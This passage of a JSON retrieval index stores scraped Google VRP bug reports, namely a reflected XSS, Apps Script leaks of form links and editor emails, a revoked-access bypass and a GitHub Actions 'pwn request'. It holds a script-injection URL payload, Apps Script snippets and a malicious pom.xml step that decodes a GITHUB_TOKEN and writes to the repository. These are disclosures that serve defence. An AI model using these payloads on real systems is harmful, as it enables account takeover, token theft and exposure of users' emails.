them.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 3553, "end_char_idx": 5228, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "b49f4c2c-01ee-4143-a9ae-a783564b7da0": {"__data__": {"id_": "b49f4c2c-01ee-4143-a9ae-a783564b7da0", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_710647.txt", "file_name": "20250408_172348_710647.txt", "file_type": "text/plain", "file_size": 1478, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "464fe239-9900-48a1-9a09-59791200ae63", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_710647.txt", "file_name": "20250408_172348_710647.txt", "file_type": "text/plain", "file_size": 1478, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "afbc50dcadea0b8946bf838a5772ac05341c92234242c1aed200774a4685c13f", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nReflected Cross-Site Scripting (XSS) on Google Acquisition Domain\r\nReported by:\r\nAkbar Kustirama\r\nGoogle VRP\r\ntriaged\r\n21:25 | Nov 25, 2024\r\naccepted\r\n20:55 | Nov 29, 2024\r\nfixed\r\n00:22 | Jan 5, 2025\r\nSummary:\r\nI have discovered a Reflected Cross-Site Scripting (XSS) vulnerability on one of the domains associated with a Google acquisition. This vulnerability allows an attacker to inject and execute malicious\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://span.sproute.net/\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nSteps to Reproduce:\r\nAccess the affected URL using the payload embedded in the query parameter:\r\nhttps://span.sproute.net/signin/?email=asdf\"><script>alert(document.domain)</script>#/\r\nThe email parameter reflects the payload directly into the HTML without proper sanitization or encoding.\r\nAs a result, the payload executes, displaying the domain name (span.sproute.net) in an alert box.\r\nAttack scenario\r\nThe vulnerability can be exploited by anyone who persuades a user to click on a specially crafted malicious link. Once the user clicks, the injected script executes in their browser, allowing the attacker to potentially steal sensitive data like session cookies, impersonate the user, or perform unauthorized actions on their behalf. This could lead to unauthorized access, data theft, or further exploitation of the victim\u2019s account or the system itself.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1460, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "e29c344a-fb84-4718-828f-daa3b04409e2": {"__data__": {"id_": "e29c344a-fb84-4718-828f-daa3b04409e2", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_778327.txt", "file_name": "20250408_172348_778327.txt", "file_type": "text/plain", "file_size": 3668, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "7f3dbb50-6522-421e-92b1-164565233d86", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_778327.txt", "file_name": "20250408_172348_778327.txt", "file_type": "text/plain", "file_size": 3668, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "7affcef0c35a7df873e36ed21778baab3e6f1fc96ffbfb835db797a9ae820d5e", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nLoophole of getting Google Form associated with Google Spreadsheet with no editor/owner access\r\nReported by:\r\nAbhishek Mathur\r\nGoogle VRP\r\ntriaged\r\n16:36 | Nov 4, 2024\r\naccepted\r\n00:05 | Nov 5, 2024\r\nfixed\r\n22:41 | Nov 28, 2024\r\nreward decided\r\n$7,500\r\nSummary:\r\nLoophole of getting Google Form associated with Google Spreadsheet with no editor/owner access\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://docs.google.com/spreadsheets/d/[REDACTED_ID]\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nNote: I have gone through\r\nhttps://bughunters.google.com/learn/improving-your-reports/6005260747014144\r\nand none of the described invalid report criteria match this one.\r\nGoogle allows to automatically store google form responses in a google spreadsheet.\r\nVia the UI or Google Drive , unless somebody has authorization of owner or editor, he is not able to see the form on the spreadsheet.\r\nFor example: If we share that sheet with the public link obtained from the share popup dialog from the top right, we get a link with view only access to the sheet.\r\nHowever, the UI of the google spreadsheet or the Google Drive Web UI doesnt allow us to view the form that is linked to this spreadsheet in viewer mode\r\nBut, I found a loophole  to find the form link of the spreadsheet ( google form associated with the spreadsheet ) with no EDITOR/OWNER access by only using the google spreadsheet document ID\r\nSteps to reproduce:\r\nGet the Spreadsheet Id of the orginial form linked spreadsheet from the URL , its a long alphanumberic string like for\r\nhttps://docs.google.com/spreadsheets/d/[REDACTED_ID]\r\nthe document id is\r\n*[REDACTED_ID]*\r\nOpen a new spreadsheet under your account, then go the the apps script section from the menus above.\r\nIn the google apps  script editor of this another sheet we just made we can just put the ID obtained of the first original sheet who we just have viewer access to , and we can get the form link easily\r\nCode:\r\nfunction myFunction() {\r\n  // ANY PUBLICLY VISIBLE GOOGLE SPREADSHEET WHICH IS LINKED TO A GOOGLE FORM\r\n  console.log(SpreadsheetApp.openById('[REDACTED_ID]').getFormUrl())\r\nOutput of this:\r\nhttps://docs.google.com/forms/d/[REDACTED_ID]/viewform\r\nI have attached screenshot of the sheet not showing the form options ( like the form menu from the top ) in the Google Spreadsheet UI and the working of the exploit in my google apps script editor\r\nYou can clearly see i am not the owner of the sheet nor the editor of this sheet but was able to get the form url. This can have serious consequences as someone who shares the sheet via public link only wants to share the responses and certainly doesn't want others to submit more responses .\r\nAny attacker with view access to the sheet who can get the form will be able to submit bogus form responses to alter the sheet which clearly is a security violation. It can also allow attacker to subsequently alter the integrity of the responses.\r\nAttack scenario\r\nAnybody who gets the spreadsheet document id will be able to get the form url ( also the form id ) of the form linked to the spreadsheet with just the viewer role.\r\nThis currently is allowed by the UI. It is a clear security violation. The UI also intentionally hides the options to view the linked Google form.This is also not possible via Google Drive.\r\nWhat they gain when doing so:\r\nThe attackers can get the form link, submit bad responses which will get added to sheet damaging its integrity. For example on a survey, they can submit bogus responses to change the overall yes/no poll voting kind of aggregation the sheet may have.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3652, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "071216a7-284a-4ad7-a17a-2c2d293afacb": {"__data__": {"id_": "071216a7-284a-4ad7-a17a-2c2d293afacb", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_873880.txt", "file_name": "20250408_172348_873880.txt", "file_type": "text/plain", "file_size": 3643, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "bc58b7b1-a5d7-4260-8acf-4f789b3b2b75", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_873880.txt", "file_name": "20250408_172348_873880.txt", "file_type": "text/plain", "file_size": 3643, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "c99f0b097285f2998344e70c6bf6a9258d1641ab1d3a75fa28ed4d5796c0d27f", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nLoophole to see the editors of a Google Document with no granted access(owner/editor) with just the fileid ( can be obtained from publicly shared links with 0 access )\r\nReported by:\r\nAbhishek Mathur\r\nGoogle VRP\r\ntriaged\r\n16:34 | Nov 4, 2024\r\naccepted\r\n23:56 | Nov 4, 2024\r\nfixed\r\n12:46 | Dec 6, 2024\r\nreward decided\r\n$15,000\r\nSummary:\r\nLoophole to see the editors of a Google Document with no granted access(owner/editor) with just the fileid ( can be obtained from publicly shared links with 0 access )\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://docs.google.com/document/d/1o6sMyyoEX9b8bN2OJUmdR6rnehxbce_SmRk7xCYJ-UI\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nNote: I have gone though\r\nhttps://bughunters.google.com/learn/invalid-reports/5374985771941888\r\nand would like to first say counter to any possible confusions For\r\nhttps://bughunters.google.com/learn/invalid-reports/google-products/4983708328919040/ability-to-map-email-addresses-to-profile-names\r\n, I want to say that I am able to get the email addresses when they should not be visible so this is not applicable here\r\nYou can do this with any publicly shared Google Docs Document I am taking this for an example:\r\nhttps://docs.google.com/document/d/1o6sMyyoEX9b8bN2OJUmdR6rnehxbce_SmRk7xCYJ-UI\r\nScreenshot of exploit attached along with how its not visible in Google Docs UI This was shared to me via a link and i dont have editor/viewer/owner access on my google account The email, username and userloginid of all the editors of this document was not visible via the Webpage opened by the following link But i was able to view the same of all the editors using this loophole\r\nCreate a new Google Docs Document under your google account \r\nOpen Google apps script of that sheet\r\nRun the following code\r\nfunction myFunction() {\r\n  // ANY PUBLICLY VISIBLE GOOGLE DOCS DOCUMENT ID \r\n  console.log(DocumentApp.openById('1o6sMyyoEX9b8bN2OJUmdR6rnehxbce_SmRk7xCYJ-UI').getEditors().map(f=>{\r\n    return Object.keys(f).filter(z=>typeof f[z]=='function').map(key=>[key,f[key]()])\r\n  }))\r\n}\r\nYou can replace 1o6sMyyoEX9b8bN2OJUmdR6rnehxbce_SmRk7xCYJ-UI with any Document Id of publicly shared Google Docs Document with no access to any editor/owner role granted by email based permission\r\nThe output was\r\n[ [ [ 'toString', '[REDACTED_USERNAME]@gmail.com' ],\r\n    [ 'getUsername', '[REDACTED_USERNAME]' ],\r\n    [ 'getUserLoginId', '[REDACTED_USERNAME]@gmail.com' ],\r\n    [ 'getEmail', '[REDACTED_USERNAME]@gmail.com' ] ],\r\n  [ [ 'toString', '[REDACTED_USERNAME]@student.nitw.ac.in' ],\r\n    [ 'getUsername', '[REDACTED_USERNAME]' ],\r\n    [ 'getUserLoginId', '[REDACTED_USERNAME]@student.nitw.ac.in' ],\r\n    [ 'getEmail', '[REDACTED_USERNAME]@student.nitw.ac.in' ] ] ]\r\nThis information is not visible via google drive too, also if you are not an editor, you should clearly not be able to see the email ids of all the editors , so its a clear cut privacy violation\r\nAttack scenario\r\nAnyone can exploit this for any publicly shared Google Docs Document ( They can get the fileid from the link shared ( public viewing link with no access granting by email ) )\r\nThey will be able to get the email, username and userloginid of all the editors of the publicly shared google document even though its not showed in the Google Docs Document UI or Google Drive since the access is not granted explicitly via email address.\r\nThis is clearly a violation of the privacy principle as the details of all the editors are hidden when google Docs Document is shared publicly to protect privacy of the sheet editors\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3627, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "90d1da6b-fd79-44d6-a706-db4d5688d490": {"__data__": {"id_": "90d1da6b-fd79-44d6-a706-db4d5688d490", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_937161.txt", "file_name": "20250408_172348_937161.txt", "file_type": "text/plain", "file_size": 3228, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "aaf9ebd8-4ad7-4f07-89be-9f04af239db4", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172348_937161.txt", "file_name": "20250408_172348_937161.txt", "file_type": "text/plain", "file_size": 3228, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "14e66fe0d0c78a1e46abe36e11f5d6ab33ebf652464cdf71b1b9f3a30192a060", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nGoogle Apps Script: Issue with Library Access: Revoked Users Can Still See Versions\r\nReported by:\r\nMelissa De Leon\r\nGoogle VRP\r\ntriaged\r\n15:36 | Sep 26, 2024\r\nclosed\r\n20:17 | Sep 26, 2024\r\ntriaged\r\n14:43 | Sep 30, 2024\r\naccepted\r\n06:01 | Oct 4, 2024\r\ntriaged\r\n21:22 | Nov 12, 2024\r\naccepted\r\n01:58 | Nov 15, 2024\r\nfixed\r\n15:47 | Dec 14, 2024\r\ntriaged\r\n09:47 | Dec 27, 2024\r\naccepted\r\n18:50 | Jan 3, 2025\r\nfixed\r\n17:26 | Jan 23, 2025\r\nreward decided\r\n$500\r\nSummary:\r\nGoogle Apps Script: Issue with Library Access: Revoked Users Can Still See Versions\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nhttps://script.google.com/macros/library/d/1gG5xVEhGDrE0xWhHnJC4mZVwYwyIP_vhrGKIcNIvI_H5ArAtpFDM5PO8/1\r\nVulnerability type:\r\nPermissions Bypass\r\nDetails\r\nVulnerability Summary\r\nUsers who have their access revoked from a Google Apps Script library are still able to view both existing and new versions of the library. This behavior persists even after the user has been explicitly removed from the list of collaborators.\r\nSteps to Reproduce\r\nStep 1\r\n: Create a Google Apps Script Project. (New Project)\r\nStep 2\r\n: Deploy 1 or more versions. For example Test 100 , description v1 v2 v3\r\nStep 3\r\n: Share it with a user (the second account) with Editor access.\r\nStep 4\r\n: Allow the second account to edit the library and create a new version.\r\nStep 5\r\n: The editor can open one of the versions with access permission. That's the correct behavior.\r\nStep 6\r\n: Owner revoke access for the second account.\r\nStep 7\r\n: Go to the second account, as long as logged in the same browser, even opening and closing it, the session to access the library is still there.\r\nStep 8\r\n: Attempt to access the library using the second account via the direct URL, any versions of it, just by changing the ending number from 1 to its latest version.\r\nhttps://script.google.com/macros/library/d/1gG5xVEhGDrE0xWhHnJC4mZVwYwyIP_vhrGKIcNIvI_H5ArAtpFDM5PO8/4\r\nStep 9\r\nOwner create a new version of the library, the second account has already been revoked the access.\r\nStep 10\r\n: Observe that the second account can still view the library and its versions, including those created after access was revoked.\r\nExpected Behavior\r\nOnce a user\u2019s access is revoked, they should no longer have the ability to view, access, or interact with the library or its versions.\r\nActual Behavior\r\nThe revoked user retains access to the library and can view all versions, including those created after the access revocation.\r\nAttack scenario\r\nFormer Editors\r\n: Users who previously had Editor access to the library could exploit their ability to view sensitive or proprietary code even after being removed from the project.\r\nPotential Misuse\r\n:\r\nData Theft\r\n: Accessing sensitive information could lead to data leakage and theft.\r\nMalicious Activities\r\n: Former collaborators might leverage their knowledge of the library for malicious purposes.\r\nRegulatory Compliance Risks\r\n:\r\nOrganizations subject to regulations (like GDPR, HIPAA, etc.) rely on strict access controls to protect sensitive information.\r\nAny failure in access management could lead to compliance violations and potential legal consequences.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3210, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8ef1328f-faf1-46e9-a781-c59c55778b9f": {"__data__": {"id_": "8ef1328f-faf1-46e9-a781-c59c55778b9f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172349_002274.txt", "file_name": "20250408_172349_002274.txt", "file_type": "text/plain", "file_size": 2252, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "ac841265-22a9-430a-8e01-3803f83f66f9", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_172349_002274.txt", "file_name": "20250408_172349_002274.txt", "file_type": "text/plain", "file_size": 2252, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "c380caa1f605b616fb052fc1f63c2ec39d273e69fcf38e1fbdf6c23bf4460c79", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nGoogle Issue Tracker: Titles of Yet-to-Fix Reports Can Be Exposed When Rewarded via Bugcrowd\r\nReported by:\r\nKavindu Pasan\r\nGoogle VRP\r\naccepted\r\n17:42 | Sep 16, 2024\r\nfixed\r\n13:06 | Oct 4, 2024\r\nSummary:\r\nGoogle Issue Tracker: Titles of Yet-to-Fix Reports Can Be Exposed When Rewarded via Bugcrowd\r\nProgram:\r\nGoogle VRP\r\nURL:\r\nissuetracker.google.com\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nWhen VRP rewards are paid using the legacy method, no information about the bug is included in invoices or other payment related documents, only a reference number is provided [screenshot 1].\r\nHowever, when rewards are processed via Bugcrowd, the bug is imported into Bugcrowd in a \"Resolved\" state [screenshot 2], including its title as it is on issuetracker.google.com. This \"Resolved\" status can lead to the bug title being exposed in various ways:\r\nOn Bugcrowd, it explicitly states, \"This submission has been fixed!\" [screenshot 3]. This may mislead the bug hunter into believing the issue is resolved, prompting them to think it's safe to publish the report. In fact, Bugcrowd even recommends this [screenshot 4].\r\nWhen exporting payment history for accounting and tax purposes, the bug title is included in the downloaded CSV [screenshot 5]. This exposes the title to unintended parties, such as accountants and tax officers, when shared.\r\nThe bug title might also be exposed to the bank as a reference when the payout is made (I'm not sure about this).\r\nSince Bugcrowd is used only for rewarding\u2014not for receiving or publishing reports\u2014using a reference number (as in the legacy method) instead of the actual bug title would be a safer approach when importing the bug into Bugcrowd. (Does Bugcrowd even need to know details about an open issue on Google?) Additionally, reconsider importing bugs with a \"Resolved\" status.\r\nFor an attacker, the bug title alone is often enough to reconstruct the issue after some investigation.\r\nAttack scenario\r\nThere is no specific attack scenario for this bug. However, if the information falls into the wrong hands, it's only a matter of time before they rediscover the bug using the reference from the title.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2232, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "f0b6b36c-8300-4553-b231-dd5126602d68": {"__data__": {"id_": "f0b6b36c-8300-4553-b231-dd5126602d68", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_096710.txt", "file_name": "20250408_175638_096710.txt", "file_type": "text/plain", "file_size": 6225, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e00e7ba4-11de-4daf-9d78-d4c8e6289029", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_096710.txt", "file_name": "20250408_175638_096710.txt", "file_type": "text/plain", "file_size": 6225, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "6aaf87230254590fd7e44e5840e258225739d66923816fe7a6bb8ad408cd0035", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "0bb5e08a-a226-489c-865d-c2e685b01bc4", "node_type": "1", "metadata": {}, "hash": "2d971ded32a56b5b9780e241a03b32bc764d96554f0378910d7529ba21663870", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nGoogle Cloud Data Fusion, built upon the open-source CDAP code, has multiple GitHub Actions \"pwn request\" vulnerabilities allowing RCE and build artifact compromise\r\nReported by:\r\nFran\u00e7ois Proulx\r\nGoogle VRP\r\ntriaged\r\n17:29 | Aug 9, 2024\r\naccepted\r\n22:57 | Aug 23, 2024\r\nfixed\r\n08:47 | Sep 26, 2024\r\nreward decided\r\n$15,000\r\nSummary:\r\nGoogle Cloud Data Fusion, built upon the open-source CDAP code, has multiple GitHub Actions \"pwn request\" vulnerabilities allowing RCE and build artifact compromise\r\nProgram:\r\nOSS VRP\r\nURL:\r\nhttps://github.com/data-integrations/google-cloud/blob/develop/.github/workflows/build.yml\r\nVulnerability type:\r\nRemote Code Execution (RCE)\r\nDetails\r\nVideo walk-through\r\nI made a video walk-through demonstrating that attack:\r\nhttps://drive.google.com/file/d/1OOEEMrQW9bJS7PrbyybKheabUBTKuT-c/view?usp=sharing\r\nIntroduction\r\nGoogle Cloud Data Fusion is built upon the open-source CDAP code, developed by Cask Data and acquired by Google in 2018. The CDAP project, maintained by Google staff, exists today within the GitHub organization \"data-integrations,\" which is clearly labeled as an official Google product and in scope for the Google Bug Bounty program (\r\nhttps://github.com/data-integrations/google-cloud/blob/develop/SECURITY.md\r\n).\r\nObservations\r\nGitHub Actions Workflows:\r\nMost public repositories in the \"data-integrations\" organization use GitHub Actions workflows.\r\nThese workflows DO NOT trigger on the more risky\r\npull_request_target\r\nevent.\r\nThe \"cdapio\" GitHub organization is also clearly labeled \"CDAP is now part of Google Cloud\" and exhibits the same problems that we highlight below.\r\nWorkflow Run Triggers:\r\nApproximately 22 repositories have workflows triggering on the\r\nworkflow_run\r\nevent without a\r\nbranches:\r\nfilter. If we also consider the \"cdapio\" organization there are 5 more repositories also affected there.\r\nThese workflows use the\r\nactions/checkout@v3\r\nstep to check out untrusted code from incoming pull requests, by specifying\r\n${{ github.event.workflow_run.head_sha }}\r\n.\r\nTrigger Workflow:\r\nThe\r\nworkflow_run\r\nworkflows are triggered by a workflow named\r\nTrigger build\r\n(\r\ntrigger.yml\r\n), which exists in all those repositories.\r\nComments in\r\ntrigger.yml\r\nindicate a clear understanding of the risks on the part of the engineers who wrote the workflow, by requiring manual review and a PR label\r\nbuild\r\nto run Maven tests on untrusted code from forks.\r\nVulnerability Exploitation\r\nAn attacker can exploit this setup by:\r\nSubmitting a Malicious Pull Request:\r\nCreate a draft PR containing a new\r\n.github/workflows/whatever.yml\r\nthat triggers on\r\non: pull_request\r\n, with the\r\nname: Trigger Build\r\n.\r\nThis workflow will obviously not have access to any secret and simply needs to succeed (i.e.,\r\nexit 0\r\n).\r\nTriggering the Build Workflow:\r\nThe successful execution of the malicious workflow triggers the\r\nbuild.yml\r\nworkflow.\r\nThis classic \"pwn request\" scenario allows the attacker to exploit Maven's interpretation of a maliciously crafted\r\npom.xml\r\n.\r\nPotential Consequences:\r\nThe\r\nbuild.yml\r\nworkflow inherits the old insecure defaults without explicit\r\nGITHUB_TOKEN\r\npermissions:\r\ndown-scoping, meaning we could confirm by looking at actions logs that it has full\r\nwrite\r\naccess.\r\nEven with settings like \"Require approval for first-time contributors,\" a threat actor can social engineer the repo maintainer to accept a benign PR, promoting their author association from \"first-time contributor\" to \"contributor,\" then enabling stealthy attack execution.\r\nSelf-Hosted Runner Risks:\r\nMost of those workflows run on a self-hosted runner labeled\r\nk8s-runner-build\r\n.\r\nEvidence found in run logs indicate that the self-hosted runner is almost certainly non-ephemeral, allowing potential \"Runner-on-Runner\" attacks where an attacker can implant their own self-hosted runner on the same VM and use it as a C2 to establish persistence.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3949, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "0bb5e08a-a226-489c-865d-c2e685b01bc4": {"__data__": {"id_": "0bb5e08a-a226-489c-865d-c2e685b01bc4", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_096710.txt", "file_name": "20250408_175638_096710.txt", "file_type": "text/plain", "file_size": 6225, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "e00e7ba4-11de-4daf-9d78-d4c8e6289029", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_096710.txt", "file_name": "20250408_175638_096710.txt", "file_type": "text/plain", "file_size": 6225, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "6aaf87230254590fd7e44e5840e258225739d66923816fe7a6bb8ad408cd0035", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "f0b6b36c-8300-4553-b231-dd5126602d68", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_096710.txt", "file_name": "20250408_175638_096710.txt", "file_type": "text/plain", "file_size": 6225, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "e24b790212da4c30717c6e5afb023fb01e03c85d2b805a2e6b0366d7993bc5f5", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Potential Consequences:\r\nThe\r\nbuild.yml\r\nworkflow inherits the old insecure defaults without explicit\r\nGITHUB_TOKEN\r\npermissions:\r\ndown-scoping, meaning we could confirm by looking at actions logs that it has full\r\nwrite\r\naccess.\r\nEven with settings like \"Require approval for first-time contributors,\" a threat actor can social engineer the repo maintainer to accept a benign PR, promoting their author association from \"first-time contributor\" to \"contributor,\" then enabling stealthy attack execution.\r\nSelf-Hosted Runner Risks:\r\nMost of those workflows run on a self-hosted runner labeled\r\nk8s-runner-build\r\n.\r\nEvidence found in run logs indicate that the self-hosted runner is almost certainly non-ephemeral, allowing potential \"Runner-on-Runner\" attacks where an attacker can implant their own self-hosted runner on the same VM and use it as a C2 to establish persistence.\r\nPOC\r\nBogus Workflow\r\nname: Trigger build\r\non: pull_request\r\njobs:\r\n  whatever:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - run: exit 0\r\nMaliciously craft pom.xml\r\n...\r\n    <profile>\r\n      <id>cloudBuild</id>\r\n      <activation>\r\n        <property><name>cloudBuild</name></property>\r\n      </activation>\r\n      <build>\r\n        <plugins>\r\n          <plugin>\r\n            <groupId>org.codehaus.mojo</groupId>\r\n            <artifactId>exec-maven-plugin</artifactId>\r\n            <version>3.1.1</version>\r\n            <executions>\r\n              <execution>\r\n                <id>run-after-clean</id>\r\n                <phase>clean</phase>\r\n                <goals>\r\n                  <goal>exec</goal>\r\n                </goals>\r\n                <configuration>\r\n                  <executable>/bin/bash</executable>\r\n                  <arguments>\r\n                    <argument>-c</argument>\r\n                    <argument>export GH_TOKEN=$(cat .git/config | grep extraheader | cut -d' ' -f5 | base64 --decode | cut -d: -f2); gh api --method PUT /repos/$GITHUB_REPOSITORY/contents/pwned.txt -f branch=feature/next-release -f message=pwn -f content=cHduZWQgYnkgdmlrb3JpdW0K</argument>\r\n                  </arguments>\r\n                </configuration>\r\n              </execution>\r\n            </executions>\r\n          </plugin>\r\n          <plugin>\r\n...\r\nAttack scenario\r\nAny GitHub user has the ability to open a pull request from a fork against the repositories to exploit this vulnerability. This includes both first-time contributors and existing contributors.  The initial exploitation does not require any special permissions or secrets.\r\nWhat They Gain When Doing So\r\nBy exploiting this vulnerability, an attacker can:\r\nTrigger a workflow that runs untrusted code in the context of the GitHub Actions workflow with access to build-time secrets.\r\nExecute arbitrary code, which ultimately allow compromising signed down-stream artifacts on Maven Central.\r\nAllow further manipulation of the repository, such as modifying existing PRs, pushing malicious code, or deleting evidence of the attack of the attack.\r\nEstablish persistence on the non-ephemeral self-hosted runner to potentially execute further attacks within the infrastructure.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 3071, "end_char_idx": 6208, "metadata_seperator": "\n", "text_template": 